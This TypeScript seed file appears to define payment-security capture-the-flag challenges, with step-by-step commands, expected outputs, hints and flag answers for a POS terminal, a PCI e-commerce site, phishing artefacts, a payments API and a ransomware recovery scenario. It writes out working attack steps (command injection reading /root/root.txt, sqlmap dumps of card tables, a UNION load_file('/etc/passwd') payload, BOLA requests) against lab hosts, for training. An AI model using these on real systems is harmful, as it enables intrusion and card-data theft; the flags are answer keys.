export type CtfCategory =
    | 'PIN_CRACKING'
    | 'REPLAY_ATTACK'
    | 'MITM'
    | 'FRAUD_CNP'
    | 'ISO8583_MANIPULATION'
    | 'HSM_ATTACK'
    | '3DS_BYPASS'
    | 'CRYPTO_WEAKNESS'
    | 'PRIVILEGE_ESCALATION'
    | 'EMV_CLONING'
    | 'TOKEN_VAULT'
    | 'NETWORK_ATTACK'
    | 'KEY_MANAGEMENT'
    | 'ADVANCED_FRAUD'
    | 'SUPPLY_CHAIN'
    | 'BOSS';

export type CtfDifficulty = 'BEGINNER' | 'INTERMEDIATE' | 'ADVANCED' | 'EXPERT';
export type CtfWorkflowMode = 'FLAG_ONLY' | 'TASK_VALIDATION';

export type CtfStepType =
    | 'EXPLANATION'
    | 'CURL_COMMAND'
    | 'CODE_SNIPPET'
    | 'OBSERVATION'
    | 'ANALYSIS'
    | 'EXPLOITATION'
    | 'HINT';

export interface CtfGuidedStepSeed {
    stepNumber: number;
    stepTitle: string;
    stepDescription: string;
    stepType: CtfStepType;
    commandTemplate?: string;
    expectedOutput?: string;
    hintText?: string;
}

export interface CtfHintSeed {
    hintNumber: number;
    hintText: string;
    costPoints: number;
}

export interface CtfMissionBriefSeed {
    role: string;
    businessContext: string;
    incidentTrigger: string;
    objective: string;
    successCriteria: string;
}

export interface CtfIncidentArtifactSeed {
    artifactId: string;
    artifactType: 'LOG' | 'TRACE' | 'TICKET' | 'SIEM';
    title: string;
    description: string;
    sample: string;
}

export interface CtfRubricCriterionSeed {
    criterion: string;
    weight: number;
    description: string;
}

export interface CtfProofRubricSeed {
    technical: CtfRubricCriterionSeed[];
    communication: CtfRubricCriterionSeed[];
    passingScore: number;
}

export interface CtfDebriefTemplateSeed {
    rootCausePrompt: string;
    impactPrompt: string;
    mitigationPrompt: string;
    evidencePrompt: string;
    checklist: string[];
}

export interface CtfChallengeSeed {
    code: string;
    title: string;
    description: string;
    freeModeDescription: string;
    category: CtfCategory;
    difficulty: CtfDifficulty;
    points: number;
    flagValue: string;
    prerequisiteChallengeCode?: string;
    targetService: string;
    targetEndpoint: string;
    vulnerabilityType: string;
    attackVector: string;
    learningObjectives: string[];
    estimatedMinutes: number;
    isActive: boolean;
    relatedWorkshopPath?: string;
    workflowMode?: CtfWorkflowMode;
    guidedSteps: CtfGuidedStepSeed[];
    hints: CtfHintSeed[];
    missionBrief?: CtfMissionBriefSeed;
    incidentArtifacts?: CtfIncidentArtifactSeed[];
    proofRubric?: CtfProofRubricSeed;
    debriefTemplate?: CtfDebriefTemplateSeed;
    /**
     * Initial vulnerability configuration applied to each student when they start this challenge.
     * Set by the gateway via the HSM internal admin endpoint — never toggled by students.
     * Keys match VulnerabilityConfig fields in VulnEngine.ts.
     */
    initialVulnConfig?: Record<string, boolean>;
}

const RAW_CTF_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'PAY-001',
        title: 'The Unsecured Payment Terminal',
        description: 'Audit a bakery payment terminal, capture cleartext transactions, then exploit an exposed admin executor.',
        freeModeDescription: 'Perform network reconnaissance, sniff cleartext POS transactions, and exploit an insecure admin panel to recover user/root proof.',
        category: 'MITM',
        difficulty: 'BEGINNER',
        points: 150,
        flagValue: 'PMP{rce_admin_panel_root_9a2b1}',
        targetService: 'pos-terminal',
        targetEndpoint: 'http://MACHINE_IP:8080',
        vulnerabilityType: 'Cleartext transaction transport + command injection',
        attackVector: 'Sniff plaintext transaction stream, then exploit unsanitized admin command parameter.',
        learningObjectives: [
            'Understand why cleartext payment traffic is critical in payment environments.',
            'Use tcpdump to capture and inspect in-flight HTTP transaction payloads.',
            'Exploit a weak admin execution endpoint and prove root impact.',
        ],
        estimatedMinutes: 30,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        workflowMode: 'TASK_VALIDATION',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Task 1 - Reconnaissance',
                stepDescription: 'Identify exposed services on MACHINE_IP. Run nmap and determine which port is open for HTTP administration.',
                stepType: 'ANALYSIS',
                commandTemplate: 'nmap -sV MACHINE_IP',
                expectedOutput: '8080/tcp open http',
                hintText: 'Port 8080 is commonly used for admin interfaces.',
            },
            {
                stepNumber: 2,
                stepTitle: 'Task 2 - Capture Network Traffic',
                stepDescription: 'Capture traffic and find cleartext transactions. Look for TRANSACTION records and extract the user flag after flag=.',
                stepType: 'OBSERVATION',
                commandTemplate: 'tcpdump -i eth0 host MACHINE_IP -A -nn',
                expectedOutput: 'PMP{cleartext_pos_sniff_4c8f3}',
                hintText: 'The user flag appears directly in the transaction payload.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Task 3 - Explore Admin Interface',
                stepDescription: 'Probe the web service on port 8080, then POST to /admin/exec and execute id.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'curl http://MACHINE_IP:8080/admin/exec -X POST -d \"cmd=id\"',
                expectedOutput: 'uid=0(root) gid=0(root) groups=0(root)',
                hintText: 'The endpoint executes the cmd parameter without proper validation.',
            },
            {
                stepNumber: 4,
                stepTitle: 'Task 4 - Get Root Proof',
                stepDescription: 'Use the same admin endpoint to read /root/root.txt and capture the root flag.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'curl http://MACHINE_IP:8080/admin/exec -X POST -d \"cmd=cat /root/root.txt\"',
                expectedOutput: 'PMP{rce_admin_panel_root_9a2b1}',
                hintText: 'The second flag is in /root/root.txt.',
            },
            {
                stepNumber: 5,
                stepTitle: 'Task 5 - Synthesis',
                stepDescription: 'Summarize both vulnerabilities and business impact in a few sentences: cleartext payment traffic + command injection to root.',
                stepType: 'EXPLANATION',
                hintText: 'Mention cleartext interception risk and root compromise through insecure admin command execution.',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Start with service enumeration, then focus on traffic visibility and exposed admin routes.',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Use tcpdump output in ASCII mode and inspect payload fields containing TRANSACTION.',
                costPoints: 12,
            },
            {
                hintNumber: 3,
                hintText: 'Try POST /admin/exec with simple commands first (id), then read /root/root.txt.',
                costPoints: 25,
            },
        ],
        initialVulnConfig: {
            insecureTransportEnabled: true,
            adminCommandInjectionEnabled: true,
        },
    },
    {
        code: 'PCI-001',
        title: 'PCI-DSS Showdown',
        description: 'Assess PCI DSS weaknesses on an e-commerce stack and collect audit evidence through SQL injection and configuration review.',
        freeModeDescription: 'Recon the web app, exploit SQL injection, extract sensitive evidence, and document PCI DSS non-compliance.',
        category: 'TOKEN_VAULT',
        difficulty: 'INTERMEDIATE',
        points: 200,
        flagValue: 'PMP{pci_dss_root_violation_8c4e7}',
        prerequisiteChallengeCode: 'PAY-001',
        targetService: 'pci-web',
        targetEndpoint: 'http://MACHINE_IP/search.php?q=test',
        vulnerabilityType: 'SQL injection + PCI DSS non-compliant data handling',
        attackVector: 'Exploit vulnerable search parameter and inspect exposed data/control failures.',
        learningObjectives: [
            'Identify SQL injection exposure in payment-adjacent web workflows.',
            'Validate PCI DSS requirements around card data and prohibited CVV storage.',
            'Produce concise compliance findings backed by technical evidence.',
        ],
        estimatedMinutes: 45,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        workflowMode: 'TASK_VALIDATION',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Task 1 - Web Reconnaissance',
                stepDescription: 'Visit http://MACHINE_IP and inspect the product search flow. Identify how many GET parameters are used on search.',
                stepType: 'OBSERVATION',
                commandTemplate: 'curl \"http://MACHINE_IP/search.php?q=test\"',
                expectedOutput: '1 (parameter q)',
                hintText: 'Watch the URL query string while searching.',
            },
            {
                stepNumber: 2,
                stepTitle: 'Task 2 - SQL Injection Enumeration',
                stepDescription: 'Use SQL injection on the search parameter to enumerate databases and identify the customer data database.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'sqlmap -u \"http://MACHINE_IP/search.php?q=test\" --dbs',
                expectedOutput: 'ecommerce_db',
                hintText: 'Look for a database name related to customers or e-commerce data.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Task 3 - Extract Card Data Evidence',
                stepDescription: 'Dump the cards table from ecommerce_db and recover the user flag.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'sqlmap -u \"http://MACHINE_IP/search.php?q=test\" -D ecommerce_db -T cards --dump',
                expectedOutput: 'PMP{pci_dss_weak_sql_5f3a2}',
                hintText: 'The flag is in a column named flag or similar.',
            },
            {
                stepNumber: 4,
                stepTitle: 'Task 4 - Server Configuration Audit',
                stepDescription: 'Try reading system file content through SQL injection and identify the UID 0 user in /etc/passwd.',
                stepType: 'ANALYSIS',
                commandTemplate: '\' UNION SELECT null, load_file(\'/etc/passwd\'), null --',
                expectedOutput: 'root',
                hintText: 'The first account in /etc/passwd is usually root.',
            },
            {
                stepNumber: 5,
                stepTitle: 'Task 5 - Critical PCI DSS Violation',
                stepDescription: 'Identify the forbidden column in cards table that violates PCI DSS post-authorization storage rules.',
                stepType: 'ANALYSIS',
                expectedOutput: 'cvv (or cvv2)',
                hintText: 'PCI DSS forbids storing card verification values.',
            },
            {
                stepNumber: 6,
                stepTitle: 'Task 6 - Root Proof',
                stepDescription: 'Recover the final root proof from /root/root.txt using the available exploit path in this lab scenario.',
                stepType: 'EXPLOITATION',
                expectedOutput: 'PMP{pci_dss_root_violation_8c4e7}',
                hintText: 'The final proof is the root flag string.',
            },
            {
                stepNumber: 7,
                stepTitle: 'Task 7 - Audit Synthesis',
                stepDescription: 'Summarize discovered PCI DSS non-compliance findings (SQL injection, CVV storage, weak credential/storage practices).',
                stepType: 'EXPLANATION',
                hintText: 'Mention technical issue + compliance impact + why it violates PCI DSS expectations.',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Start from search parameter mapping, then escalate to structured SQLi enumeration.',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Use sqlmap for speed, but verify key outputs manually for your report.',
                costPoints: 12,
            },
            {
                hintNumber: 3,
                hintText: 'Focus on compliance evidence: card data exposure, CVV persistence, and privileged impact.',
                costPoints: 25,
            },
        ],
        initialVulnConfig: {
            searchSqliEnabled: true,
            weakKeyStorageEnabled: true,
        },
    },
    {
        code: 'SOC-001',
        title: 'The Social Engineer\'s Wire',
        description: 'Investigate phishing and social engineering artifacts to uncover transfer fraud indicators.',
        freeModeDescription: 'Analyze provided emails and call artifacts, identify spoofing signals, and propose prevention controls.',
        category: 'FRAUD_CNP',
        difficulty: 'INTERMEDIATE',
        points: 150,
        flagValue: 'PMP{SOC001_STATIC_FALLBACK}',
        prerequisiteChallengeCode: 'PCI-001',
        targetService: 'soc-artifacts',
        targetEndpoint: '/room/soc-001',
        vulnerabilityType: 'Social engineering through phishing, spoofing, and fraudulent transfer pressure',
        attackVector: 'Correlate sender spoofing, return-path mismatch, deceptive links, and urgent wire instructions.',
        learningObjectives: [
            'Detect phishing indicators in email content and headers.',
            'Identify spoofing and social pressure techniques in fraud scenarios.',
            'Recommend practical anti-fraud verification controls.',
        ],
        estimatedMinutes: 30,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        workflowMode: 'TASK_VALIDATION',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Task 1 - Suspicious Email Review',
                stepDescription: 'Open email1.eml and identify the sender shown in the From header.',
                stepType: 'OBSERVATION',
                commandTemplate: 'grep -i \"^From:\" email1.eml',
                expectedOutput: 'support@banque-securite.com',
                hintText: 'Read the displayed sender first before deep header checks.',
            },
            {
                stepNumber: 2,
                stepTitle: 'Task 2 - Header Authenticity Check',
                stepDescription: 'Inspect full headers and extract Return-Path to detect sender spoofing.',
                stepType: 'ANALYSIS',
                commandTemplate: 'grep -i \"return-path\" email1.eml',
                expectedOutput: 'phisher@malicious.net',
                hintText: 'Compare Return-Path with From value.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Task 3 - Fraudulent Link Detection',
                stepDescription: 'Find the real destination behind the \"secure your account\" link in email1.eml.',
                stepType: 'ANALYSIS',
                commandTemplate: 'grep -i \"href\" email1.eml',
                expectedOutput: 'http://192.168.1.105/fake-login',
                hintText: 'Do not trust visible anchor text; inspect href target.',
            },
            {
                stepNumber: 4,
                stepTitle: 'Task 4 - Voice Spoofing Clue',
                stepDescription: 'Review call1.mp3 transcript/evidence and identify the number the scammer claims to represent.',
                stepType: 'OBSERVATION',
                expectedOutput: '01 23 45 67 89',
                hintText: 'Capture the exact phone number mentioned in the call intro.',
            },
            {
                stepNumber: 5,
                stepTitle: 'Task 5 - Fraud Wire Instruction',
                stepDescription: 'Read email2.eml and extract both requested amount and destination IBAN.',
                stepType: 'ANALYSIS',
                expectedOutput: '15000 - FR76 1234 5678 9012 3456 7890 123',
                hintText: 'You must provide both amount and account details.',
            },
            {
                stepNumber: 6,
                stepTitle: 'Task 6 - Prevention Synthesis',
                stepDescription: 'Provide at least three practical anti-phishing and anti-fraud practices.',
                stepType: 'EXPLANATION',
                hintText: 'Mention independent verification and link/identity checks.',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Start with headers (From, Return-Path, Reply-To) before interpreting message text.',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Extract raw artifacts directly from files; avoid assumptions from rendered previews.',
                costPoints: 12,
            },
            {
                hintNumber: 3,
                hintText: 'In synthesis, combine technical checks and process controls (call-back validation, dual approval).',
                costPoints: 25,
            },
        ],
    },
    {
        code: 'API-001',
        title: 'API: Attack on Transactions',
        description: 'Exploit weak API authorization and control failures to access restricted payment data.',
        freeModeDescription: 'Discover endpoints, obtain JWT access, exploit BOLA and broken admin controls, and document impact.',
        category: 'PRIVILEGE_ESCALATION',
        difficulty: 'ADVANCED',
        points: 250,
        flagValue: 'PMP{api_admin_exposure_9f1b4}',
        prerequisiteChallengeCode: 'SOC-001',
        targetService: 'payments-api',
        targetEndpoint: 'http://MACHINE_IP:5000/',
        vulnerabilityType: 'Broken object level authorization + weak access control + business limit bypass',
        attackVector: 'Abuse insecure object references, bypass transfer controls, and reach admin data paths.',
        learningObjectives: [
            'Test authorization boundaries on REST resources (BOLA).',
            'Detect weak business logic controls such as bypassable transfer limits.',
            'Assess privilege escalation risk in JWT/admin endpoint handling.',
        ],
        estimatedMinutes: 50,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        workflowMode: 'TASK_VALIDATION',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Task 1 - API Surface Discovery',
                stepDescription: 'Query API root and count listed routes/endpoints.',
                stepType: 'OBSERVATION',
                commandTemplate: 'curl http://MACHINE_IP:5000/',
                expectedOutput: '5',
                hintText: 'Root response returns a JSON route listing.',
            },
            {
                stepNumber: 2,
                stepTitle: 'Task 2 - Account + Login',
                stepDescription: 'Register a user then login to obtain an access token.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'curl -X POST http://MACHINE_IP:5000/api/login -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"test\\\",\\\"password\\\":\\\"test\\\"}\"',
                expectedOutput: 'access_token starts with eyJ...',
                hintText: 'JWT tokens usually begin with eyJ.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Task 3 - BOLA Exploitation',
                stepDescription: 'Use your token to request user id=1 data and extract the user flag.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'curl -H \"Authorization: Bearer <token>\" http://MACHINE_IP:5000/api/users/1',
                expectedOutput: 'PMP{api_bola_vulnerability_7d8e2}',
                hintText: 'Look for a flag field in returned JSON.',
            },
            {
                stepNumber: 4,
                stepTitle: 'Task 4 - Transfer Limit Bypass',
                stepDescription: 'Attempt a transfer above nominal limit (e.g., amount 2000) and confirm if it succeeds.',
                stepType: 'ANALYSIS',
                commandTemplate: 'curl -X POST http://MACHINE_IP:5000/api/transfer -H \"Authorization: Bearer <token>\" -H \"Content-Type: application/json\" -d \"{\\\"to\\\":\\\"autre_compte\\\",\\\"amount\\\":2000}\"',
                expectedOutput: 'yes / success',
                hintText: 'Validate with response status field, not assumptions.',
            },
            {
                stepNumber: 5,
                stepTitle: 'Task 5 - Admin Exposure',
                stepDescription: 'Reach /api/admin/stats despite normal user context and recover the root flag.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'curl -H \"Authorization: Bearer <token>\" http://MACHINE_IP:5000/api/admin/stats',
                expectedOutput: 'PMP{api_admin_exposure_9f1b4}',
                hintText: 'Inspect token claims and access control validation weaknesses.',
            },
            {
                stepNumber: 6,
                stepTitle: 'Task 6 - Vulnerability Synthesis',
                stepDescription: 'Summarize the exploited API weaknesses (BOLA, limit bypass, insufficient admin access control).',
                stepType: 'EXPLANATION',
                hintText: 'State each flaw and its impact on confidentiality/integrity.',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Map endpoints first, then authenticate before authorization testing.',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Replay requests by changing resource ids and transaction amount values.',
                costPoints: 12,
            },
            {
                hintNumber: 3,
                hintText: 'For admin access issues, inspect JWT structure and server-side role validation.',
                costPoints: 25,
            },
        ],
        initialVulnConfig: {
            bolaEnabled: true,
            transferLimitBypassEnabled: true,
            adminCommandInjectionEnabled: true,
        },
    },
    {
        code: 'DORA-001',
        title: 'DORA\'s Recovery',
        description: 'Manage a ransomware incident, restore operations, and produce a DORA-aligned resilience report.',
        freeModeDescription: 'Investigate compromise evidence, isolate affected paths, restore from backup, and document timeline/impact/actions.',
        category: 'BOSS',
        difficulty: 'EXPERT',
        points: 300,
        flagValue: 'PMP{dora_recovery_success_3e6d9}',
        prerequisiteChallengeCode: 'API-001',
        targetService: 'dora-frontend',
        targetEndpoint: '/incident/start',
        vulnerabilityType: 'Initial access + operational resilience failure',
        attackVector: 'Exploit exposed service, induce disruption scenario, then execute structured recovery and reporting.',
        learningObjectives: [
            'Model attacker entry and blast-radius in a multi-service banking environment.',
            'Execute restoration and service continuity checks from clean backup state.',
            'Produce a defensible post-mortem aligned with resilience governance expectations.',
        ],
        estimatedMinutes: 60,
        isActive: true,
        relatedWorkshopPath: '/student/cursus',
        workflowMode: 'TASK_VALIDATION',
        guidedSteps: [
            {
                stepNumber: 1,
                stepTitle: 'Task 1 - Incident Detection',
                stepDescription: 'Inspect compromised web node artifacts and identify the ransomware note filename.',
                stepType: 'OBSERVATION',
                commandTemplate: 'ls -la /var/www/html',
                expectedOutput: 'README_RANSOM.txt',
                hintText: 'Look for obvious ransom note naming patterns.',
            },
            {
                stepNumber: 2,
                stepTitle: 'Task 2 - Initial Access Trace',
                stepDescription: 'Analyze Apache access logs and identify the source IP of the initial attack.',
                stepType: 'ANALYSIS',
                commandTemplate: 'grep \"POST\" /var/log/apache2/access.log',
                expectedOutput: '192.168.1.100',
                hintText: 'Focus on suspicious upload/execution requests.',
            },
            {
                stepNumber: 3,
                stepTitle: 'Task 3 - Lateral Movement Attribution',
                stepDescription: 'Review SSH authentication logs and identify which account key was used toward app-backend.',
                stepType: 'ANALYSIS',
                commandTemplate: 'grep \"sshd\" /var/log/auth.log | grep \"Accepted\"',
                expectedOutput: 'appuser',
                hintText: 'Track accepted SSH sessions and usernames.',
            },
            {
                stepNumber: 4,
                stepTitle: 'Task 4 - Containment Rule',
                stepDescription: 'Provide an iptables command that blocks traffic from web-front to core-banking.',
                stepType: 'EXPLOITATION',
                expectedOutput: 'iptables -A OUTPUT -s MACHINE_IP_WEB -d MACHINE_IP_CORE -j DROP',
                hintText: 'A DROP rule with correct source/destination direction is required.',
            },
            {
                stepNumber: 5,
                stepTitle: 'Task 5 - Backup Integrity Selection',
                stepDescription: 'Identify the latest complete non-corrupted backup date from backup-server.',
                stepType: 'ANALYSIS',
                commandTemplate: 'ls -la /backups',
                expectedOutput: '2026-02-20',
                hintText: 'Prefer latest backup without encrypted/corrupted indicators.',
            },
            {
                stepNumber: 6,
                stepTitle: 'Task 6 - Core Recovery Flag',
                stepDescription: 'Restore core-banking from clean backup and retrieve recovery flag from recovery_flag table.',
                stepType: 'EXPLOITATION',
                commandTemplate: 'mysql -u root -p core_banking -e \"SELECT flag FROM recovery_flag;\"',
                expectedOutput: 'PMP{dora_recovery_success_3e6d9}',
                hintText: 'Confirm restore before querying recovery_flag.',
            },
            {
                stepNumber: 7,
                stepTitle: 'Task 7 - Service Continuity Check',
                stepDescription: 'Validate API health after recovery and provide the HTTP status code.',
                stepType: 'OBSERVATION',
                commandTemplate: 'curl -i http://MACHINE_IP_APP:8080/api/health',
                expectedOutput: '200',
                hintText: 'Healthy service should return HTTP 200 and OK semantics.',
            },
            {
                stepNumber: 8,
                stepTitle: 'Task 8 - DORA Incident Report',
                stepDescription: 'Submit a concise report containing timeline, impact, corrective actions, and recurrence prevention recommendations.',
                stepType: 'EXPLANATION',
                hintText: 'Use structured incident language aligned with operational resilience reporting.',
            },
        ],
        hints: [
            {
                hintNumber: 1,
                hintText: 'Work in phases: detect, contain, recover, then report.',
                costPoints: 5,
            },
            {
                hintNumber: 2,
                hintText: 'Use logs and backup inventory as primary evidence before taking recovery actions.',
                costPoints: 12,
            },
            {
                hintNumber: 3,
                hintText: 'A valid DORA-oriented answer ties technical actions to business continuity outcomes.',
                costPoints: 25,
            },
        ],
        initialVulnConfig: {
            ransomwareSimulationEnabled: true,
            backupRestoreModeEnabled: true,
        },
    },
];

const HINT_LEVEL_1_COST = 5;
const HINT_LEVEL_2_COST = 12;
const HINT_LEVEL_3_COST = 25;
const LEVEL_1_FALLBACK = 'Analysez la surface exposee puis confirmez un comportement anormal.';

const CATEGORY_ATTACK_CLASS: Record<CtfCategory, string> = {
    PIN_CRACKING: 'Weak authentication / credential handling',
    REPLAY_ATTACK: 'Broken anti-replay controls',
    MITM: 'Insecure transport / cleartext exposure',
    FRAUD_CNP: 'Business logic abuse (fraud decisioning)',
    ISO8583_MANIPULATION: 'Protocol message tampering',
    HSM_ATTACK: 'Broken access control / cryptographic misuse',
    '3DS_BYPASS': 'Authentication workflow bypass',
    CRYPTO_WEAKNESS: 'Weak cryptography / weak randomness',
    PRIVILEGE_ESCALATION: 'Broken authorization',
    EMV_CLONING: 'EMV trust boundary bypass',
    TOKEN_VAULT: 'Sensitive data exposure',
    NETWORK_ATTACK: 'Insecure network trust model',
    KEY_MANAGEMENT: 'Key lifecycle and segregation failure',
    ADVANCED_FRAUD: 'Adaptive fraud evasion',
    SUPPLY_CHAIN: 'Supply chain compromise',
    BOSS: 'Multi-stage chained exploitation',
};

const CATEGORY_TOOL_HINT: Record<CtfCategory, string> = {
    PIN_CRACKING: 'nmap, curl',
    REPLAY_ATTACK: 'curl, burp repeater',
    MITM: 'nmap, tshark',
    FRAUD_CNP: 'curl, jq',
    ISO8583_MANIPULATION: 'nmap, pyiso8583',
    HSM_ATTACK: 'nmap, ffuf',
    '3DS_BYPASS': 'curl, jq',
    CRYPTO_WEAKNESS: 'curl, python',
    PRIVILEGE_ESCALATION: 'ffuf, curl',
    EMV_CLONING: 'tshark, curl',
    TOKEN_VAULT: 'curl, jq',
    NETWORK_ATTACK: 'nmap, tshark',
    KEY_MANAGEMENT: 'curl, jq',
    ADVANCED_FRAUD: 'curl, jq',
    SUPPLY_CHAIN: 'curl, grep',
    BOSS: 'nmap, tshark, ffuf',
};

const CATEGORY_EVIDENCE_AREA: Record<CtfCategory, string> = {
    PIN_CRACKING: 'Comparez la decision avant/apres indisponibilite du composant critique.',
    REPLAY_ATTACK: 'Comparez les reponses de deux requetes strictement identiques.',
    MITM: 'Inspectez la charge utile capturee sur le reseau, pas seulement la reponse applicative.',
    FRAUD_CNP: 'Observez le champ de score/decision et ses variations selon les attributs.',
    ISO8583_MANIPULATION: 'Visez les champs protocole sensibles et la logique de validation serveur.',
    HSM_ATTACK: 'Cherchez une fuite dans les metadonnees, les erreurs ou les logs.',
    '3DS_BYPASS': 'Surveillez la transition des statuts d authentification et les identifiants de session.',
    CRYPTO_WEAKNESS: 'Cherchez la preuve dans la structure du token ou la prevision de sequence.',
    PRIVILEGE_ESCALATION: 'Verifiez si la meme action est possible sans role attendu.',
    EMV_CLONING: 'Inspectez les metadonnees terminales et l absence de controles contextuels.',
    TOKEN_VAULT: 'Regardez la difference entre erreurs, format de token et donnees renvoyees.',
    NETWORK_ATTACK: 'Priorite aux paquets et aux traces de transport plutot qu au front-end.',
    KEY_MANAGEMENT: 'Concentrez-vous sur les metadonnees de cycle de vie et les operations d export.',
    ADVANCED_FRAUD: 'Mesurez les seuils et les effets de cumul manquants.',
    SUPPLY_CHAIN: 'Recherchez les artefacts tiers et les surfaces d administration exposees.',
    BOSS: 'Reliez les preuves de chaque etape de la chaine dans un ordre defensible.',
};

const CATEGORY_ROLE: Record<CtfCategory, string> = {
    PIN_CRACKING: 'payment security engineer',
    REPLAY_ATTACK: 'incident responder',
    MITM: 'network security engineer',
    FRAUD_CNP: 'fraud analyst',
    ISO8583_MANIPULATION: 'payment switch engineer',
    HSM_ATTACK: 'crypto security engineer',
    '3DS_BYPASS': '3DS security specialist',
    CRYPTO_WEAKNESS: 'application security engineer',
    PRIVILEGE_ESCALATION: 'backend security engineer',
    EMV_CLONING: 'card issuing security engineer',
    TOKEN_VAULT: 'tokenization engineer',
    NETWORK_ATTACK: 'network defense engineer',
    KEY_MANAGEMENT: 'key management specialist',
    ADVANCED_FRAUD: 'senior fraud hunter',
    SUPPLY_CHAIN: 'platform security lead',
    BOSS: 'red team lead',
};

const CATEGORY_CONTEXT: Record<CtfCategory, string> = {
    PIN_CRACKING: 'Issuer authorization flow with PIN verification under PCI constraints.',
    REPLAY_ATTACK: 'Card payment API where transaction replay can create duplicate financial impact.',
    MITM: 'Inter-service payment traffic where cleartext or weak integrity can be intercepted.',
    FRAUD_CNP: 'Card-not-present fraud monitoring under high transaction velocity.',
    ISO8583_MANIPULATION: 'Switch and issuer message validation for ISO 8583 fields and business rules.',
    HSM_ATTACK: 'Cryptographic operations delegated to HSM services with strict access boundaries.',
    '3DS_BYPASS': 'Strong Customer Authentication path in 3DS challenge and verification flow.',
    CRYPTO_WEAKNESS: 'Critical token and authorization code generation path.',
    PRIVILEGE_ESCALATION: 'Access control checks on high-impact financial operations.',
    EMV_CLONING: 'EMV terminal and issuer interactions under anti-cloning controls.',
    TOKEN_VAULT: 'Token vault and detokenization controls for PAN protection.',
    NETWORK_ATTACK: 'Segmentation and trust boundaries in payment network topology.',
    KEY_MANAGEMENT: 'Cryptographic key lifecycle and separation of duties.',
    ADVANCED_FRAUD: 'Cross-signal fraud decisioning with adaptive defense requirements.',
    SUPPLY_CHAIN: 'Operational dependencies and third-party trust in payment infrastructure.',
    BOSS: 'Multi-stage incident combining exploitation, containment, and strategic remediation.',
};

const DEFAULT_PROOF_RUBRIC: CtfProofRubricSeed = {
    technical: [
        { criterion: 'Reproducible exploitation evidence', weight: 40, description: 'Commands, payloads, and outputs are replayable.' },
        { criterion: 'Root cause accuracy', weight: 30, description: 'Explains the exact control failure that enabled exploitation.' },
        { criterion: 'Patch validation before/after', weight: 30, description: 'Shows exploit works before and fails after mitigation.' },
    ],
    communication: [
        { criterion: 'Incident summary clarity', weight: 40, description: 'Executive-level summary is concise and accurate.' },
        { criterion: 'Prioritized mitigation plan', weight: 35, description: 'Actions are ordered by risk and delivery feasibility.' },
        { criterion: 'Evidence traceability', weight: 25, description: 'Each claim is linked to a concrete artifact.' },
    ],
    passingScore: 70,
};

function normalizeWhitespace(value: string): string {
    return value.replace(/\s+/g, ' ').trim();
}

function containsExplicitCommand(value: string): boolean {
    return /(\bcurl\b|\bwget\b|http:\/\/|https:\/\/|\bPOST\b|\bGET\b|\/[a-z0-9\-_]+\/[a-z0-9\-_]+)/i.test(value);
}

function sanitizeLevel1Hint(value: string): string {
    const compact = normalizeWhitespace(value)
        .replace(/PMP\{[^}]*\}/gi, 'PMP{...}')
        .replace(/\bflag\b/gi, 'preuve');

    if (!compact) {
        return LEVEL_1_FALLBACK;
    }

    if (containsExplicitCommand(compact)) {
        return LEVEL_1_FALLBACK;
    }

    return compact;
}

function sanitizeHint(value: string, fallback: string): string {
    const compact = normalizeWhitespace(value)
        .replace(/PMP\{[^}]*\}/gi, 'PMP{...}');

    return compact || fallback;
}

function sanitizeLevel2Cost(rawCost: number): number {
    if (Number.isFinite(rawCost) && rawCost >= 10 && rawCost <= 15) {
        return Math.floor(rawCost);
    }

    return HINT_LEVEL_2_COST;
}

function buildMissionBrief(challenge: CtfChallengeSeed): CtfMissionBriefSeed {
    return {
        role: CATEGORY_ROLE[challenge.category],
        businessContext: CATEGORY_CONTEXT[challenge.category],
        incidentTrigger: normalizeWhitespace(challenge.description),
        objective: `Exploit ${challenge.vulnerabilityType} on ${challenge.targetService} then produce a defensible remediation.`,
        successCriteria: `Recover a valid flag for ${challenge.code} and deliver root cause + prioritized mitigation with before/after proof.`,
    };
}

function buildIncidentArtifacts(challenge: CtfChallengeSeed): CtfIncidentArtifactSeed[] {
    const challengeSlug = challenge.code.toLowerCase().replace(/[^a-z0-9]+/g, '-');

    return [
        {
            artifactId: `${challenge.code}-log`,
            artifactType: 'LOG',
            title: 'Application log extract',
            description: `Raw service logs captured during ${challenge.code} exploitation window.`,
            sample: `[${challengeSlug}] service=${challenge.targetService} endpoint="redacted-until-complete" signal="unexpected behavior"`,
        },
        {
            artifactId: `${challenge.code}-siem`,
            artifactType: 'SIEM',
            title: 'SIEM alert card',
            description: 'Synthetic SIEM card with anomaly context and impacted asset.',
            sample: `rule=ctf_${challengeSlug}_anomaly severity=high asset=${challenge.targetService} vector="${challenge.attackVector}"`,
        },
        {
            artifactId: `${challenge.code}-ticket`,
            artifactType: 'TICKET',
            title: 'Incident response ticket',
            description: 'Ops ticket to capture timeline, owner, and mitigation decisions.',
            sample: `INC-${challenge.code} status=open owner=SOC summary="${challenge.vulnerabilityType}"`,
        },
    ];
}

